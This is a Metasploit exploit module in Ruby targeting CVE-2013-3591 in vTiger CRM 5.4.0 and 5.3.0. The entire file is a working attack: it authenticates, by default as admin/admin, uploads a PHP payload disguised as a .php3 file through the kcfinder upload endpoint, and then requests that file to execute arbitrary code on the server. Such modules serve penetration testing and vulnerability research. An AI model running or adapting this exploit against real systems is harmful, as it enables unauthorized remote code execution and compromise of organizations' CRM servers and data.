# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039; => &#039;vTigerCRM v5.4.0/v5.3.0 Authenticated Remote Code Execution&#039;,
      &#039;Description&#039; => %q{
      vTiger CRM allows an authenticated user to upload files to embed within documents.
      Due to insufficient privileges on the &#039;files&#039; upload folder, an attacker can upload a PHP
      script and execute aribtrary PHP code remotely.

      This module was tested against vTiger CRM v5.4.0 and v5.3.0.
      },
      &#039;Author&#039; =>
        [
          &#039;Brandon Perry <bperry.volatile[at]gmail.com>&#039; # Discovery / msf module
        ],
      &#039;License&#039; => MSF_LICENSE,
      &#039;References&#039; =>
        [
          [&#039;CVE&#039;, &#039;2013-3591&#039;],
          [&#039;URL&#039;, &#039;https://community.rapid7.com/community/metasploit/blog/2013/10/30/seven-tricks-and-treats&#039;]
        ],
      &#039;Privileged&#039; => false,
      &#039;Platform&#039;   => [&#039;php&#039;],
      &#039;Arch&#039;       => ARCH_PHP,
      &#039;Payload&#039;    =>
        {
          &#039;BadChars&#039; => "&\n=+%",
        },
      &#039;Targets&#039; =>
        [
          [ &#039;Automatic&#039;, { } ],
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Oct 30 2013&#039;))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [ true, "Base vTiger CRM directory path", &#039;/vtigercrm/&#039;]),
        OptString.new(&#039;USERNAME&#039;, [ true, "Username to authenticate with", &#039;admin&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [ false, "Password to authenticate with", &#039;admin&#039;])
      ], self.class)
  end

  def check
    res = nil
    begin
      res = send_request_cgi({ &#039;uri&#039; => normalize_uri(target_uri.path, &#039;/index.php&#039;) })
    rescue
      print_error("Unable to access the index.php file")
      return CheckCode::Unknown
    end

    if res and res.code != 200
      print_error("Error accessing the index.php file")
      return CheckCode::Unknown
    end

    if res.body =~ /<div class="poweredBy">Powered by vtiger CRM - (.*)<\/div>/i
      print_status("vTiger CRM version: " + $1)
      case $1
      when &#039;5.4.0&#039;, &#039;5.3.0&#039;
        return CheckCode::Vulnerable
      else
        return CheckCode::Safe
      end
    end

    return CheckCode::Unknown
  end

  def exploit

      init = send_request_cgi({
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039; =>  normalize_uri(target_uri.path, &#039;/index.php&#039;)
      })

      sess = init.get_cookies

      post = {
        &#039;module&#039; => &#039;Users&#039;,
        &#039;action&#039; => &#039;Authenticate&#039;,
        &#039;return_module&#039; => &#039;Users&#039;,
        &#039;return_action&#039; => &#039;Login&#039;,
        &#039;user_name&#039; => datastore[&#039;USERNAME&#039;],
        &#039;user_password&#039; => datastore[&#039;PASSWORD&#039;]
      }

      login = send_request_cgi({
        &#039;method&#039; => &#039;POST&#039;,
        &#039;uri&#039; => normalize_uri(target_uri.path, &#039;/index.php&#039;),
        &#039;vars_post&#039; => post,
        &#039;cookie&#039; => sess
      })

      fname = rand_text_alphanumeric(rand(10)+6) + &#039;.php3&#039;
      cookies = login.get_cookies

      php = %Q|<?php #{payload.encoded} ?>|
      data = Rex::MIME::Message.new
      data.add_part(php, &#039;application/x-php&#039;, nil, "form-data; name=\"upload\"; filename=\"#{fname}\"");
      data.add_part(&#039;files&#039;, nil, nil, &#039;form-data; name="dir"&#039;)

      data_post = data.to_s

      res = send_request_cgi({
        &#039;method&#039; => &#039;POST&#039;,
        &#039;uri&#039; => normalize_uri(target_uri.path, &#039;/kcfinder/browse.php?type=files&lng=en&act=upload&#039;),
        &#039;ctype&#039; => "multipart/form-data; boundary=#{data.bound}",
        &#039;data&#039; => data_post,
        &#039;cookie&#039; => cookies
      })
      if res and res.code == 200
        print_status("Triggering payload...")
        send_request_raw({&#039;uri&#039; => datastore["TARGETURI"] + "/test/upload/files/#{fname}"}, 5)
      end
  end
end

